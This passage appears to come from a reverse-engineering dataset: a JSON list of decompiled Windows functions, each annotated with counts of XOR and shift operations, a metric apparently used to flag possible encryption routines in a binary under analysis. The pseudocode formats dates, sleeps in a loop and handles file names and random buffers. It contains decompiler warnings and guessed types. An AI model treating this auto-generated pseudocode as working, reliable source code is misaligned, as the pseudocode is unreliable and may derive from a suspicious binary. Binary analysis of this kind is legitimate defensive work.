v78 - 4;\n                  v25 = 2i64;\n                  if ( (unsigned __int64)(v78 - 4) < 2 )\n                    v25 = v78 - 4;\n                  if ( v25 )\n                  {\n                    if ( v25 == 1 )\n                    {\n                      v2 = (__int64)sub_140026A84(v22 + 1);\n                    }\n                    else\n                    {\n                      switch ( v78 )\n                      {\n                        case 0i64:\n                          v99 = sub_140038380(v22 + 1);\n                          goto LABEL_168;\n                        case 1i64:\n                          sub_140038BF0(v22 + 1);\n                          goto LABEL_169;\n                        case 2i64:\n                          v99 = sub_140028347(v22 + 1);\n                          goto LABEL_168;\n                        case 3i64:\n                          v99 = sub_14002836C(v22 + 1);\nLABEL_168:\n                          v2 = (__int64)v99;\n                          if ( v99 )\n                            goto LABEL_171;\nLABEL_169:\n                          sub_140027494((__int64)&v130, (__int64)(v22 + 6));\n                          v108 = sub_140026A96((__int64)&v130, (__int64)&off_140068220);\n                          v125 = v22;\n                          v109 = v19;\n                          v111 = v110;\n                          *(_DWORD *)(v108 + 14) = *(_DWORD *)(v108 + 10);\n                          v2 = sub_14004EA51((char *)(v108 + 9), v110);\n                          v112 = v108;\n                          v23 = v142;\n                          v113 = v111;\n                          v19 = v109;\n                          v22 = v125;\n                          sub_14004CA6E(v112, v113);\n                          break;\n                      }\n                    }\n                    if ( v2 )\n                      goto LABEL_171;\n                  }\n                }\n                goto LABEL_85;\n              }\nLABEL_176:\n              v150 = (__int64 *)v127;\n              v149 = v126;\n              v143 = &v149;\n              *(_QWORD *)&v130 = &off_140068830;\n              *((_QWORD *)&v130 + 1) = 1i64;\n              v144 = (size_t)sub_14004E3FA;\n              v131 = (__int64)&v143;\n              v132 = 1ui64;\n              sub_14005CD00((__int64)&v130, (__int64)&off_140068840);\n            }\n            v39 = *(_DWORD *)v136;\n            v40 = *(_QWORD *)&v136[4];\n            v41 = (char)v138;\n            v42 = v137;\n            sub_140027B1E(0i64, v37);\n            if ( (v40 & 0x100000000000000i64) == 0 )\n            {\n              sub_140027B1E(0i64, v43);\n              sub_140027B1E(0i64, v44);\n              if ( (unsigned int)v39 < 0x4E2000 )\n              {\n                v45 = (v41 << 16) | v42;\n                if ( (v45 & 0xFF0000) == 0 )\n                {\n                  sub_140025D14(&v130, v124, v39 >> 9);\n                  if ( !(_QWORD)v130 )\n                  {\n                    v129 = v40;\n                    v46 = *((_QWORD *)&v130 + 1);\n                    sub_1400258B1((__int64 *)&v130, v124, (unsigned __int8 *)&unk_140068770, 1ui64);\n                    if ( !(_QWORD)v130 )\n                    {\n                      v139 = v46;\n                      v47 = *((_QWORD *)&v130 + 1);\n                      v48 = sub_14004E1DF(v39);\n                      v50 = v49;\n                      sub_1400257B0(&v130, v124, v48);\n                      if ( !(_QWORD)v130 )\n                      {\n                        v140 = v47;\n                        v51 = *((_QWORD *)&v130 + 1);\n                        sub_1400258B1((__int64 *)&v130, v124, (unsigned __int8 *)&unk_140068770, 1ui64);\n                        if ( !(_QWORD)v130 )\n                        {\n                          v141 = v51;\n                          v145 = (unsigned __int8 *)&unk_140068770;\n                          v52 = *((_QWORD *)&v130 + 1);\n                          sub_1400257B0(&v130, v124, v50);\n                          if ( !(_QWORD)v130 )\n                          {\n                            v53 = *((_QWORD *)&v130 + 1);\n                            sub_1400258B1((__int64 *)&v130, v124, \"TZ() \", 1ui64);\n                            if ( !(_QWORD)v130 )\n                            {\n                              v148 = *((_QWORD *)&v130 + 1);\n                              sub_1400257B0(&v130, v124, BYTE6(v129));\n                              if ( !(_QWORD)v130 )\n                              {\n                                v147 = *((_QWORD *)&v130 + 1);\n                                sub_1400258B1((__int64 *)&v130, v124, (unsigned __int8 *)word_14006AE28, 1ui64);\n                                if ( !(_QWORD)v130 )\n                                {\n                                  v54 = *((_QWORD *)&v130 + 1);\n                                  sub_1400257B0(&v130, v124, BYTE5(v129));\n                                  if ( !(_QWORD)v130 )\n                                  {\n                                    v157 = *((_QWORD *)&v130 + 1);\n                                    sub_1400258B1((__int64 *)&v130, v124, (unsigned __int8 *)word_14006AE28, 1ui64);\n                                    if ( !(_QWORD)v130 )\n                                    {\n                                      v156 = *((_QWORD *)&v130 + 1);\n                                      sub_1400257B0(&v130, v124, BYTE4(v129));\n                                      if ( !(_QWORD)v130 )\n                                      {\n                                        v55 = *((_QWORD *)&v130 + 1)\n                                            + v139\n                                            + v140\n                                            + v52\n                                            + v141\n                                            + v147\n                                            + v148\n                                            + v53\n                                            + v156\n                                            + v157\n                                            + v54;\n                                        v56 = v55;\n                                        if ( (_DWORD)v129 )\n                                        {\n                                          sub_1400258B1((__int64 *)&v130, v124, (unsigned __int8 *)\".\\\\\", 1ui64);\n                                          if ( (_QWORD)v130 )\n                                            goto LABEL_57;\n                                          v57 = *((_QWORD *)&v130 + 1) + v55;\n                                          if ( (unsigned int)v129 % 0xA )\n                                          {\n                                            sub_140025909(&v130, v124, v129);\n                                          }\n                                          else if ( (unsigned int)v129 / 0xA % 0xA )\n                                          {\n                                            sub_1400259D8(&v130, v124, (unsigned int)v129 / 0xA);\n                                          }\n                                          else if ( (unsigned int)v129 / 0x64 % 0xA )\n                                          {\n                                            sub_140025AA7(&v130, v124, (unsigned int)v129 / 0x64);\n                                          }\n                                          else if ( (unsigned int)v129 / 0x3E8 % 0xA )\n                                          {\n                                            sub_140025B76(&v130, v124, (unsigned int)v129 / 0x3E8);\n                                          }\n                                          else if ( (unsigned int)v129 / 0x2710 % 0xA )\n                                          {\n                                            sub_140025C45(&v130, v124, (unsigned int)v129 / 0x2710);\n                                          }\n                                          else if ( (unsigned int)v129 / 0x186A0 % 0xA )\n                                          {\n                                            sub_140025D14(&v130, v124, (unsigned int)v129 / 0x186A0);\n                                          }\n                                          else if ( (unsigned int)v129 / 0xF4240 % 0xA )\n                                          {\n                                            sub_140025DE3(&v130, v124, (unsigned int)v129 / 0xF4240);\n                                          }\n                                          else if ( (unsigned int)v129 / 0x989680 % 0xA )\n                                          {\n                                            sub_140025F81(&v130, v124, (unsigned int)v129 / 0x989680);\n                                          }\n                                          else\n                                          {\n                                            sub_140025EB2(&v130, v124, (unsigned int)v129 / 0x5F5E100);\n                                          }\n                                          if ( (_QWORD)v130 )\n                                            goto LABEL_57;\n                                          v56 = *((_QWORD *)&v130 + 1) + v57;\n                                        }\n                                        v117 = (unsigned int)v45 >> 8;\n                                        if ( (_BYTE)v45 )\n                                        {\n                                          if ( (v45 & 0x80u) != 0 )\n                                            goto LABEL_206;\n                                          goto LABEL_204;\n                                        }\n                                        if ( BYTE1(v45) )\n                                        {\nLABEL_204:\n                                          if ( (v45 & 0x8000) == 0 && v45 >= 0 )\n                                            v145 = byte_140068771;\nLABEL_206:\n                                          sub_1400258B1((__int64 *)&v130, v124, v145, 1ui64);\n                                          if ( !(_QWORD)v130 )\n                                          {\n                                            v118 = *((_QWORD *)&v130 + 1);\n                                            sub_1400257B0(&v130, v124, abs8(v45));\n                                            if ( !(_QWORD)v130 )\n                                            {\n                                              v119 = *((_QWORD *)&v130 + 1);\n                                              sub_1400258B1(\n                                                (__int64 *)&v130,\n                                                v124,\n                                                (unsigned __int8 *)word_14006AE28,\n                                                1ui64);\n                                              if ( !(_QWORD)v130 )\n                                              {\n                                                v129 = *((_QWORD *)&v130 + 1);\n                                                sub_1400257B0(&v130, v124, abs8(v117));\n                                                if ( !(_QWORD)v130 )\n                                                {\n                                                  *((_QWORD *)&v126 + 1) = *((_QWORD *)&v130 + 1)\n                                                                         + v56\n                                                                         + v118\n                                                                         + v129\n                                                                         + v119;\nLABEL_213:\n                                                  *(_QWORD *)&v126 = 3i64;\n                                                  v19 = v122;\n                                                  v21 = v120;\n                                                  v22 = (_QWORD *)v124;\n                                                  goto LABEL_61;\n                                                }\n                                              }\n                                            }\n                                          }\n                                          goto LABEL_57;\n                                        }\n                                        sub_1400258B1((__int64 *)&v130, v124, (unsigned __int8 *)\"Z() \", 1ui64);\n                                        if ( !(_QWORD)v130 )\n                                        {\nLABEL_212:\n                                          *((_QWORD *)&v126 + 1) = *((_QWORD *)&v130 + 1) + v56;\n                                          goto LABEL_213;\n                                        }\n                                      }\n                                    }\n                                  }\n                                }\n                              }\n                            }\n                          }\n                        }\n                      }\n                    }\n                  }\nLABEL_57:\n                  *((_QWORD *)&v126 + 1) = *((_QWORD *)&v130 + 1);\n                  *(_QWORD *)&v126 = 2i64;\n                  v19 = v122;\nLABEL_58:\n                  v21 = v120;\nLABEL_68:\n                  v2 = *((_QWORD *)&v126 + 1);\n                  goto LABEL_171;\n                }\nLABEL_175:\n                *(_QWORD *)&v126 = 1i64;\n                *((_QWORD *)&v126 + 1) = &unk_140068581;\n                v127 = 13i64;\n                goto LABEL_176;\n              }\n              goto LABEL_174;\n            }\n          }\n          else\n          {\n            v58 = *(_DWORD *)v136;\n            v59 = *(_QWORD *)&v136[4];\n            v60 = (char)v138;\n            v61 = v137;\n            sub_140027B1E(0i64, v37);\n            v139 = v59;\n            if ( (v59 & 0x100000000000000i64) == 0 )\n            {\n              sub_140027B1E(0i64, v62);\n              sub_140027B1E(0i64, v63);\n              v64 = sub_14004E1DF(v58);\n              if ( v58 >= 972800 )\n              {\n                LOBYTE(v129) = v64;\n                LODWORD(v140) = (v60 << 16) | v61;\n                if ( (v140 & 0xFF0000) == 0 )\n                {\n                  v66 = v65;\n                  v67 = 16i64 * (unsigned __int8)sub_14004E327(v58);\n                  v68 = *(unsigned __int8 **)((char *)&off_1400685C0 + v67);\n                  sub_1400258EB(\n                    (__int64)v68,\n                    *(unsigned __int64 *)((char *)&off_1400685C0 + v67 + 8),\n                    (__int64)&off_140068630);\n                  sub_1400258B1((__int64 *)&v130, v124, v68, 3ui64);\n                  if ( !(_QWORD)v130 )\n                  {\n                    LODWORD(v141) = v58;\n                    v76 = *((_QWORD *)&v130 + 1);\n                    sub_1400258B1(\n                      (__int64 *)&v130,\n                      v124,\n                      \", JanuaryFebruaryMarchAprilMayJuneJulyAugustSeptemberOctoberNovemberDecember\",\n                      2ui64);\n                    v19 = v122;\n                    if ( (_QWORD)v130 )\n                    {\n                      *((_QWORD *)&v126 + 1) = *((_QWORD *)&v130 + 1);\n                      *(_QWORD *)&v126 = 2i64;\n                      goto LABEL_58;\n                    }\n                    v79 = v76;\n                    v80 = *((_QWORD *)&v130 + 1);\n                    sub_1400257B0(&v130, v124, v66);\n                    if ( !(_QWORD)v130 )\n                    {\n                      v81 = *((_QWORD *)&v130 + 1);\n                      sub_1400258B1((__int64 *)&v130, v124, (unsigned __int8 *)word_140068798, 1ui64);\n                      if ( !(_QWORD)v130 )\n                      {\n                        v82 = *((_QWORD *)&v130 + 1) + v81 + v79 + v80;\n                        v83 = 16i64 * (unsigned __int8)v129;\n                        v84 = *(unsigned __int8 **)((char *)&off_140068698 + v83 - 16);\n                        sub_1400258EB(\n                          (__int64)v84,\n                          *(unsigned __int64 *)((char *)&off_140068698 + v83 - 8),\n                          (__int64)&off_140068758);\n                        sub_1400258B1((__int64 *)&v130, v124, v84, 3ui64);\n                        if ( !(_QWORD)v130 )\n                        {\n                          v85 = v82;\n                          v86 = *((_QWORD *)&v130 + 1);\n                          sub_1400258B1((__int64 *)&v130, v124, (unsigned __int8 *)word_140068798, 1ui64);\n                          if ( !(_QWORD)v130 )\n                          {\n                            v87 = *((_QWORD *)&v130 + 1);\n                            sub_140025D14(&v130, v124, (int)v141 >> 9);\n                            if ( !(_QWORD)v130 )\n                            {\n                              v129 = *((_QWORD *)&v130 + 1);\n                              sub_1400258B1((__int64 *)&v130, v124, (unsigned __int8 *)word_140068798, 1ui64);\n                              if ( !(_QWORD)v130 )\n                              {\n                                v88 = *((_QWORD *)&v130 + 1);\n                                sub_1400257B0(&v130, v124, BYTE6(v139));\n                                if ( !(_QWORD)v130 )\n                                {\n                                  v141 = *((_QWORD *)&v130 + 1);\n                                  sub_1400258B1((__int64 *)&v130, v124, (unsigned __int8 *)word_14006AE28, 1ui64);\n                                  if ( !(_QWORD)v130 )\n                                  {\n                                    v145 = (unsigned __int8 *)*((_QWORD *)&v130 + 1);\n                                    sub_1400257B0(&v130, v124, BYTE5(v139));\n                                    if ( !(_QWORD)v130 )\n                                    {\n                                      v148 = *((_QWORD *)&v130 + 1);\n                                      sub_1400258B1((__int64 *)&v130, v124, (unsigned __int8 *)word_14006AE28, 1ui64);\n                                      if ( !(_QWORD)v130 )\n                                      {\n                                        v147 = *((_QWORD *)&v130 + 1);\n                                        sub_1400257B0(&v130, v124, BYTE4(v139));\n                                        if ( !(_QWORD)v130 )\n                                        {\n                                          v139 = *((_QWORD *)&v130 + 1);\n                                          sub_1400258B1(\n                                            (__int64 *)&v130,\n                                            v124,\n                                            (unsigned __int8 *)word_140068798,\n                                            1ui64);\n                                          if ( !(_QWORD)v130 )\n                                          {\n                                            v89 = &v145[v141 + v88 + v129 + v87 + v148 + v147 + v139 + v86 + v85];\n                                            if ( (v140 & 0x80u) != 0i64 || (v140 & 0x8000) != 0 || (int)v140 < 0 )\n                                              v90 = (unsigned __int8 *)&unk_140068770;\n                                            else\n                                              v90 = byte_140068771;\n                                            v114 = &v89[*((_QWORD *)&v130 + 1)];\n                                            sub_1400258B1((__int64 *)&v130, v124, v90, 1ui64);\n                                            if ( !(_QWORD)v130 )\n                                            {\n                                              v115 = *((_QWORD *)&v130 + 1);\n                                              sub_1400257B0(&v130, v124, abs8(v140));\n                                              if ( !(_QWORD)v130 )\n                                              {\n                                                v116 = *((_QWORD *)&v130 + 1);\n                                                sub_1400257B0(&v130, v124, abs8(SBYTE1(v140)));\n                                                if ( !(_QWORD)v130 )\n                                                {\n                                                  v56 = (__int64)&v114[v115 + v116];\n                                                  goto LABEL_212;\n                                                }\n                                              }\n                                            }\n                                          }\n                                        }\n                                      }\n                                    }\n                                  }\n                                }\n                              }\n                            }\n                          }\n                        }\n                      }\n                    }\n                  }\n                  goto LABEL_57;\n                }\n                goto LABEL_175;\n              }\nLABEL_174:\n              *(_QWORD *)&v126 = 1i64;\n              *((_QWORD *)&v126 + 1) = &unk_14006857D;\n              v127 = 4i64;\n              goto LABEL_176;\n            }\n          }\n          v126 = 0i64;\n          goto LABEL_176;\n        }\nLABEL_25:\n        v34 += 60;\n        v35 = ~(_BYTE)v32;\n        goto LABEL_26;\n      }\n    }\n    v33 += 60;\n    v34 = ~(_BYTE)v31;\n    goto LABEL_25;\n  }\n  v9 = v7;\n  v10 = 24 * v8;\n  v2 = 0i64;\n  while ( v10 )\n  {\n    v11 = *(const void **)v9;\n    if ( !*(_QWORD *)v9 )\n      v11 = *(const void **)(v9 + 8);\n    v12 = *(_QWORD *)(v9 + 16);\n    v9 += 24i64;\n    v10 -= 24i64;\n    if ( sub_14004B537(v5, v6, v11, v12) )\n      goto LABEL_9;\n  }\nLABEL_172:\n  sub_140029FFD(v2);\n}\n// 140084050: invalid function type '?' has been ignored\n// 140028425: variable 'v8' is possibly undefined\n// 14002846F: variable 'v14' is possibly undefined\n// 1400284DC: variable 'v20' is possibly undefined\n// 1400287E4: variable 'v37' is possibly undefined\n// 1400287F6: variable 'v43' is possibly undefined\n// 1400287FD: variable 'v44' is possibly undefined\n// 140028896: variable 'v49' is possibly undefined\n// 140028B4B: variable 'v62' is possibly undefined\n// 140028B52: variable 'v63' is possibly undefined\n// 140028B89: variable 'v65' is possibly undefined\n// 140028FC0: variable 'v25' is possibly undefined\n// 140028FC0: variable 'v24' is possibly undefined\n// 140029962: variable 'v101' is possibly undefined\n// 140029984: variable 'v105' is possibly undefined\n// 1400299B5: variable 'v107' is possibly undefined\n// 140029A45: variable 'v110' is possibly undefined\n// 1400072C0: using guessed type void __fastcall __noreturn sub_1400072C0();\n// 140068220: using guessed type void *off_140068220;\n// 140068238: using guessed type void *off_140068238;\n// 1400684E8: using guessed type void *off_1400684E8;\n// 1400685C0: using guessed type void *off_1400685C0;\n// 140068630: using guessed type void *off_140068630;\n// 140068698: using guessed type void *off_140068698;\n// 140068758: using guessed type void *off_140068758;\n// 140068771: using guessed type unsigned __int8 byte_140068771[7];\n// 140068798: using guessed type unsigned __int16 word_140068798[4];\n// 1400687A0: using guessed type __int16 (*off_1400687A0)[4];\n// 140068830: using guessed type char *off_140068830;\n// 140068840: using guessed type void *off_140068840;\n// 140068860: using guessed type void *off_140068860;\n// 140068880: using guessed type void **off_140068880;\n// 1400688B0: using guessed type void *off_1400688B0;\n// 1400688D8: using guessed type void *off_1400688D8;\n// 140068908: using guessed type void **off_140068908;\n// 1400689E8: using guessed type char *off_1400689E8;\n// 14006ADA8: using guessed type void **off_14006ADA8;\n// 14006AE28: using guessed type unsigned __int16 word_14006AE28[4];\n// 14006CC28: using guessed type void *off_14006CC28;\n// 14006CD28: using guessed type void *off_14006CD28;\n// 14006CE20: using guessed type void *off_14006CE20;\n// 14006CE60: using guessed type void *off_14006CE60;\n// 140084050: using guessed type __int64 (__fastcall *off_140084050)(_QWORD);\n\n"
    },
    {
        "Function": "sub_14000FFD4",
        "Total XOR and shift operations": 14,
        "XOR operations": 1,
        "Shift operations": 13,
        "Operation percentage": "0.84%",
        "Function Body": "\nint __fastcall sub_14000FFD4(__int64 a1, unsigned __int64 a2)\n{\n  __int64 v2; // rsi\n  __int64 v3; // rsi\n  __int64 v4; // rax\n  __int64 v5; // rdi\n  char v6; // dl\n  _QWORD *v7; // rax\n  char v8; // dl\n  __int64 v9; // r9\n  __int64 v10; // r8\n  __int64 v11; // rcx\n  unsigned __int64 v12; // r11\n  __int64 v13; // r8\n  char v14; // r9\n  __int64 v15; // rcx\n  __int128 v16; // xmm0\n  LPCWSTR v17; // rdi\n  __int64 v18; // r14\n  char v19; // bl\n  char v20; // r15\n  char v21; // si\n  char v22; // r10\n  char v23; // r12\n  bool v24; // al\n  bool v25; // di\n  __int64 v26; // rdx\n  __int64 v27; // rcx\n  char *v28; // rsi\n  char *v29; // rax\n  __int64 v30; // rdx\n  char *v31; // rax\n  void **v32; // rcx\n  WCHAR *v33; // r12\n  void *v34; // rsi\n  __int64 v35; // rdi\n  WCHAR *v36; // r14\n  void *v37; // rsi\n  void *v38; // rsi\n  __int64 v39; // r14\n  WCHAR *v40; // rdi\n  LPCWSTR v41; // r12\n  WCHAR *v42; // r14\n  void *v43; // rsi\n  __int64 v44; // rax\n  WCHAR *v45; // rdx\n  LPCWSTR v46; // rsi\n  char *v47; // rdi\n  __int64 v48; // rdx\n  __int64 v49; // rsi\n  __int64 i; // rbx\n  int v51; // eax\n  char v52; // dl\n  char v53; // r14\n  int v54; // eax\n  char v55; // dl\n  _BYTE *v56; // rcx\n  unsigned __int64 v57; // rsi\n  __int64 v58; // rdx\n  _BYTE *v59; // rdi\n  BOOLEAN v60; // al\n  unsigned __int64 j; // rsi\n  __int64 k; // rax\n  char v63; // cl\n  unsigned __int64 m; // rsi\n  int v65; // ebx\n  bool v66; // cf\n  unsigned __int64 v67; // rsi\n  unsigned __int64 v68; // rax\n  unsigned __int64 v69; // rcx\n  unsigned __int64 v70; // rsi\n  char v71; // dl\n  unsigned __int64 v72; // rdi\n  unsigned __int64 v73; // r14\n  unsigned __int64 v74; // rsi\n  unsigned __int64 v75; // rax\n  unsigned __int64 n; // rax\n  int v77; // ecx\n  __int64 v78; // rax\n  __int64 ii; // rsi\n  unsigned __int8 v80; // al\n  unsigned __int8 v81; // al\n  char *v82; // rax\n  __int64 v83; // rdx\n  __int64 v84; // rsi\n  __int64 v85; // rcx\n  __int64 v86; // rdx\n  const WCHAR *v87; // rdx\n  float v88; // xmm0_4\n  __int64 v89; // rax\n  void *v90; // rax\n  WCHAR *v91; // rcx\n  void *v92; // r14\n  __int64 *v93; // rcx\n  float v94; // xmm12_4\n  __int64 v95; // rdi\n  __int64 v96; // rax\n  unsigned __int64 v97; // r14\n  __int64 v98; // r14\n  __int128 v99; // rax\n  WCHAR *v100; // rsi\n  __int64 v101; // r14\n  __int64 v102; // rax\n  __int64 v103; // rcx\n  unsigned __int64 v104; // rsi\n  LARGE_INTEGER v105; // rdi\n  char jj; // al\n  LARGE_INTEGER v107; // r9\n  unsigned __int64 v108; // r14\n  __int64 v109; // rax\n  __int64 v110; // rdx\n  __int64 v111; // rcx\n  __int64 v113; // rax\n  __int64 v114; // rdx\n  __int64 v115; // rdx\n  void *v116; // rcx\n  void *v117; // r14\n  char **v118; // rax\n  LPCWSTR v119; // rsi\n  char *v120; // rax\n  __int64 kk; // rcx\n  LPCWSTR v122; // rdx\n  WCHAR *v123; // rcx\n  __int64 v124; // rsi\n  void *v125; // rsi\n  char **v126; // rdi\n  __int64 v127; // rax\n  __int64 v128; // r14\n  WCHAR *v129; // rdi\n  unsigned __int64 v130; // rcx\n  __int64 v131; // rax\n  char v132; // al\n  __int64 v133; // rdx\n  char v134; // al\n  LPCWSTR v135; // rdi\n  __int64 v136; // rsi\n  LPCWSTR v137; // rdi\n  void *v138; // rsi\n  char **v139; // rax\n  WCHAR *v141; // rax\n  char **v142; // r8\n  LPCWSTR v143; // rcx\n  __int64 v144[5]; // [rsp+E8h] [rbp-50h] BYREF\n  _QWORD v145[5]; // [rsp+110h] [rbp-28h] BYREF\n  __int128 v146[2]; // [rsp+138h] [rbp+0h] BYREF\n  unsigned __int64 v147[5]; // [rsp+160h] [rbp+28h] BYREF\n  unsigned __int64 v148[5]; // [rsp+188h] [rbp+50h] BYREF\n  unsigned __int64 v149[5]; // [rsp+1B0h] [rbp+78h] BYREF\n  unsigned __int64 v150[5]; // [rsp+1D8h] [rbp+A0h] BYREF\n  unsigned __int64 v151[5]; // [rsp+200h] [rbp+C8h] BYREF\n  unsigned __int64 v152[5]; // [rsp+228h] [rbp+F0h] BYREF\n  unsigned __int64 v153[5]; // [rsp+250h] [rbp+118h] BYREF\n  __int128 v154[2]; // [rsp+278h] [rbp+140h] BYREF\n  __m256i v155; // [rsp+298h] [rbp+160h]\n  __m256i v156; // [rsp+2B8h] [rbp+180h] BYREF\n  LARGE_INTEGER v157[5]; // [rsp+2E0h] [rbp+1A8h] BYREF\n  void *v158[4]; // [rsp+308h] [rbp+1D0h] BYREF\n  _BYTE v159[15]; // [rsp+328h] [rbp+1F0h] BYREF\n  __int128 v160; // [rsp+338h] [rbp+200h]\n  __m256i v161; // [rsp+348h] [rbp+210h] BYREF\n  __int64 v162[2]; // [rsp+368h] [rbp+230h] BYREF\n  __int64 v163[2]; // [rsp+378h] [rbp+240h] BYREF\n  __int128 v164; // [rsp+388h] [rbp+250h] BYREF\n  __int128 v165; // [rsp+398h] [rbp+260h] BYREF\n  WCHAR *v166; // [rsp+3B0h] [rbp+278h] BYREF\n  __int64 v167; // [rsp+3B8h] [rbp+280h]\n  unsigned __int64 v168; // [rsp+3C0h] [rbp+288h]\n  __int64 v169; // [rsp+3D8h] [rbp+2A0h]\n  __int64 v170; // [rsp+3E0h] [rbp+2A8h]\n  unsigned __int64 v171[4]; // [rsp+3E8h] [rbp+2B0h] BYREF\n  unsigned __int64 v172; // [rsp+408h] [rbp+2D0h]\n  __int64 v173; // [rsp+410h] [rbp+2D8h] BYREF\n  unsigned __int64 v174; // [rsp+418h] [rbp+2E0h]\n  unsigned __int64 v175; // [rsp+420h] [rbp+2E8h] BYREF\n  unsigned __int64 v176; // [rsp+428h] [rbp+2F0h]\n  WCHAR *v177; // [rsp+430h] [rbp+2F8h]\n  __int128 v178[4]; // [rsp+438h] [rbp+300h] BYREF\n  __int128 v179; // [rsp+478h] [rbp+340h] BYREF\n  unsigned __int64 v180; // [rsp+488h] [rbp+350h]\n  char v181; // [rsp+490h] [rbp+358h]\n  char v182[7]; // [rsp+491h] [rbp+359h]\n  int v183[2]; // [rsp+498h] [rbp+360h]\n  __int64 v184; // [rsp+4A0h] [rbp+368h]\n  LPCWSTR lpNewFileName[15]; // [rsp+4A8h] [rbp+370h] BYREF\n  unsigned __int64 v186; // [rsp+520h] [rbp+3E8h]\n  __int128 Src[16]; // [rsp+528h] [rbp+3F0h] BYREF\n  void *v188[2]; // [rsp+628h] [rbp+4F0h] BYREF\n  unsigned __int64 v189; // [rsp+638h] [rbp+500h]\n  _BYTE v190[80]; // [rsp+648h] [rbp+510h] BYREF\n  __int128 v191[5]; // [rsp+698h] [rbp+560h] BYREF\n  int v192[2]; // [rsp+6F0h] [rbp+5B8h]\n  _BYTE RandomBuffer[80]; // [rsp+6F8h] [rbp+5C0h] BYREF\n  unsigned __int64 v194[5]; // [rsp+748h] [rbp+610h] BYREF\n  unsigned __int64 v195[6]; // [rsp+770h] [rbp+638h] BYREF\n  unsigned __int64 v196; // [rsp+7A0h] [rbp+668h] BYREF\n  unsigned __int64 v197; // [rsp+7A8h] [rbp+670h]\n  HANDLE hFile; // [rsp+7B0h] [rbp+678h]\n  WCHAR *v199; // [rsp+7B8h] [rbp+680h]\n  __int64 v200; // [rsp+7C0h] [rbp+688h]\n\n  v200 = -2i64;\n  v2 = a1;\n  v173 = a1;\n  v176 = a2;\n  v174 = a2;\n  while ( 1 )\n  {\n    v3 = v2 + 16;\n    while ( 1 )\n    {\n      while ( 1 )\n      {\n        sub_14000FE78((__int64)Src, v3);\n        v4 = sub_14000FEAF((__int64)Src, (__int64)&off_140065490);\n        v5 = *(_QWORD *)(v4 + 40);\n        sub_14000FEF7(v4, v6);\n        if ( v5 )\n          break;\n        Sleep(0x3E8u);\n        if ( (unsigned __int64)qword_140084AE8 >= 5 )\n        {\n          *(_QWORD *)&Src[0] = &off_140065580;\n          *((_QWORD *)&Src[0] + 1) = 1i64;\n          *(_QWORD *)&Src[1] = &off_14006CC28;\n          *(__int128 *)((char *)&Src[1] + 8) = 0i64;\n          sub_14000E7FB((__int64)Src, 5i64, (__int128 *)&off_1400659B0, 158);\n        }\n      }\n      sub_14000FE78((__int64)Src, v3);\n      v7 = (_QWORD *)sub_14000FEAF((__int64)Src, (__int64)&off_1400654A8);\n      v9 = v7[5];\n      if ( v9 )\n      {\n        v10 = v7[4];\n        v11 = v7[2];\n        v12 = v7[3];\n        if ( v10 + 1 < v12 )\n          v12 = 0i64;\n        v7[4] = v10 - v12 + 1;\n        v7[5] = v9 - 1;\n        v13 = 32 * v10;\n        v14 = *(_BYTE *)(v11 + v13 + 24);\n        *(_DWORD *)&RandomBuffer[3] = *(_DWORD *)(v11 + v13 + 28);\n        *(_DWORD *)RandomBuffer = *(_DWORD *)(v11 + v13 + 25);\n        if ( v14 != 2 )\n          break;\n      }\n      sub_14000FEF7((__int64)v7, v8);\n    }\n    v15 = v13 + v11;\n    v16 = *(_OWORD *)v15;\n    v180 = *(_QWORD *)(v15 + 16);\n    v179 = v16;\n    v181 = v14;\n    *(_DWORD *)&v182[3] = *(_DWORD *)&RandomBuffer[3];\n    *(_DWORD *)v182 = *(_DWORD *)RandomBuffer;\n    sub_14000FEF7((__int64)v7, v8);\n    sub_14004AB90((__int64)&v166, \"EMPTY\", 5i64);\n    sub_14003A300((__int64)lpNewFileName, (unsigned __int8 *)v179, v180);\n    v199 = v166;\n    sub_14003A300((__int64)v190, (unsigned __int8 *)v166, v168);\n    v17 = lpNewFileName[1];\n    v18 = *(_QWORD *)&v190[8];\n    v19 = (char)lpNewFileName[7];\n    v20 = v190[56];\n    v21 = BYTE1(lpNewFileName[7]);\n    v22 = v190[57];\n    v23 = (char)lpNewFileName[2];\n    if ( lpNewFileName[1] == *(LPCWSTR *)&v190[8]\n      && LOBYTE(lpNewFileName[7]) == v190[56]\n      && BYTE1(lpNewFileName[7]) == 2\n      && v190[57] == 2\n      && LOBYTE(lpNewFileName[2]) >= 3u != v190[16] < 3u )\n    {\n      LOBYTE(hFile) = v190[57];\n      v24 = sub_140022089(lpNewFileName[0], (size_t)lpNewFileName[1], *(const void **)v190, (__int64)lpNewFileName[1]);\n      v22 = (char)hFile;\n      if ( v24 )\n        break;\n    }\n    if ( v23 != 6 )\n    {\n      *(LPCWSTR *)((char *)&Src[1] + 15) = lpNewFileName[6];\n      Src[1] = *(_OWORD *)((char *)&lpNewFileName[4] + 1);\n      Src[0] = *(_OWORD *)((char *)&lpNewFileName[2] + 1);\n    }\n    *(_QWORD *)&RandomBuffer[48] = *(_QWORD *)((char *)&Src[1] + 15);\n    *(_OWORD *)&RandomBuffer[33] = Src[1];\n    *(_OWORD *)&RandomBuffer[17] = Src[0];\n    *(LPCWSTR *)RandomBuffer = lpNewFileName[0];\n    *(_QWORD *)&RandomBuffer[8] = v17;\n    RandomBuffer[16] = v23;\n    RandomBuffer[56] = v19;\n    RandomBuffer[57] = v21;\n    RandomBuffer[58] = BYTE2(lpNewFileName[7]);\n    if ( v190[16] != 6 )\n    {\n      *(_QWORD *)((char *)&v178[1] + 15) = *(_QWORD *)&v190[48];\n      v178[1] = *(_OWORD *)&v190[33];\n      v178[0] = *(_OWORD *)&v190[17];\n    }\n    *(_QWORD *)&Src[3] = *(_QWORD *)((char *)&v178[1] + 15);\n    *(__int128 *)((char *)&Src[2] + 1) = v178[1];\n    *(__int128 *)((char *)&Src[1] + 1) = v178[0];\n    *(_QWORD *)&Src[0] = *(_QWORD *)v190;\n    *((_QWORD *)&Src[0] + 1) = v18;\n    LOBYTE(Src[1]) = v190[16];\n    BYTE8(Src[3]) = v20;\n    BYTE9(Src[3]) = v22;\n    BYTE10(Src[3]) = v190[58];\n    v25 = sub_140012CB4((__int128 *)RandomBuffer, Src);\n    sub_14004D22F(v199, v167);\n    if ( v25 )\n      goto LABEL_317;\n    if ( (unsigned __int64)qword_140084AE8 > 4 )\n    {\n      sub_140012E68((__int64)RandomBuffer, (__int64)&v179);\n      v28 = sub_14002E590(v27, v26);\n      lpNewFileName[0] = *((LPCWSTR *)v28 + 2);\n      *(_QWORD *)v190 = RandomBuffer;\n      *(_QWORD *)&v190[8] = sub_140032A70;\n      *(_QWORD *)&Src[0] = &off_1400654F8;\n      *((_QWORD 